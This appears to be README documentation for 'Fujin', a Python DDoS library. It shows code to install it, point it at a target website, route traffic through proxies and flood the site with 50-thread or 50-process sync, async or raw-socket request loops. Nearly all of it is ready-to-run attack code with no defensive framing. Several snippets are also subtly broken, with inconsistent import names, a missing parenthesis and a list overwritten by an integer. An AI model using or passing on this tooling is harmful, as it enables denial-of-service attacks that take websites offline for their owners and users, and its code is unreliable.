# Documentation
Happy learnings

## Install
```
pip install Fujin
```

## Initialise Object
```
from Fujin import Fujin

url = "https://999root.xyz/"

headers = {
  "User-Agent": "fucking user agent",
  "Accept-Encoding": "gzip"
}

ddos = Fujin(url=url, header=headers)
```

## Run a simple Asynchronous DDoS
This will run an Infinite Loop Synchronous function that should infinitely send traffic to your selected website.
```
from Fujin import fujin

url = "https://999root.xyz/"

headers = {
  "User-Agent": "fucking user agent",
  "Accept-Encoding": "gzip"
}

ddos = Fujin(url=url, header=headers)
ddos.begin_async_get_attack()
```

## Use proxies
```
from Fujin import fujin

url = "https://999root.xyz/"

proxies = {
  "http": "http://[proxy]"
}

ddos = Fujin(url=url, proxies=proxies)
```

## Use threading or multiprocessing to speed up our DDoS
```
# Daemon = run in the background / threads = how many threads would you like to run
ddos.thread_async_attack(threads=50, daemon=True)
ddos.thread_sync_attack(threads=50, daemon=True)
```

```
ddos.multiproc_sync_attack(processes=50, daemon=True)
ddos.multiproc_async_attack(processes=50, daemon=True)
```

## Choose a pooling manager
Fujin gives you a choice of 3 pooling managers
- Python Requests ( requests.session() )
- AIOHTTTP Async Based Session Manager ( aiohttp.ClientSession() )
- URLLIB3 Pooling Manager ( urllib3.PoolingManager() )

Make sure you choose a pooling manager otherwise the program will prompt you to choose one. I do this because some of the pooling managers are freakishly powerful

#### Python requests
```
ddos = fujin(url="fuckingwebsite.com")
ddos.thread_async_attack(threads=50, pooling_manager="requests")
```

#### AIOHTTP
```
ddos = fujin(url="fuckingwebsite.com")
ddos.thread_async_attack(threads=50, pooling_manager="aiohttp")
```

#### URLLIB3
```
ddos = fujin(url="fuckingwebsite.com")
ddos.thread_async_attack(threads=50, pooling_manager="urllib3")
```

### SOCKET
```
# I would advise putting http:// at the start as we are directly sending HTTP Requests to the port with this one
ddos = fujin(url="http://fuckingwebsite.com")
ddos.thread_async_attack(threads=50, pooling_manager="socket")
```

# Threading Setup
```
# Array Data Structure to store your threads in
threads = []

# Number of threads
threads = 50

for x in range(threads):
  t = threading.Thread(target=attack_initialiser, args=[url, headers]
  t.daemon = True
  t.start() # Saves us opening up a 3rd separate loop
  threads.append(t)

for x in range(threads):
  threads[x].join()
```

# Example Script
```
from Fujin import fujin

url = "yourwebsite.com"

headers = {
  "User-Agent": "some user agent",
  "Accept-Encoding": "gzip"
}

ddos = fujin(url=url, header=headers)
ddos.thread_async_attack(threads=50, daemon=True, pooling_manager="aiohttp")
```

## What's faster sync or async
asnyc mate
